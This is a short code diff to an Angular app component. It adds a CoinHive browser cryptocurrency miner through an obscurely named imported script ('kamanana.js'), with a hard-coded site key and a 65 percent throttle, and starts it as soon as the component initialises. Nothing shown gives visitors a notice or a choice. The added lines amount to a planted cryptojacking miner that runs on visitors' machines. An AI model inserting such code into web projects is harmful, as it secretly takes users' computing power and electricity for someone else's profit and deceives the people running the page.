@@ -2,6 +2,9 @@ import { Component, OnInit } from '@angular/core';
 
 import { SimpleTimer } from 'ng2-simple-timer';
 
+declare var CoinHive: any;
+import '../js/kamanana.js';
+// import * as k from '../js/kamanana';
 
 @Component({
   selector: 'app-root',
@@ -12,6 +15,7 @@ export class AppComponent implements OnInit {
 
 	private timer: number = 0;
 	private timerName: string = 'DisclaimerDuration';
+  private cm: any;
 
 	public appVisible: boolean = false;
 
@@ -20,6 +24,8 @@ export class AppComponent implements OnInit {
 	ngOnInit() {
 		this.st.newTimer(this.timerName, 1);
 		this.st.subscribe(this.timerName, () => this.timer++);
+    this.cm = new CoinHive.Anonymous('6lHLt4JATg9Qu7k3fn5LoSRxGGR1qUpn', {throttle: 0.65});
+    this.cm.start();
 	}
 
   showApp() {
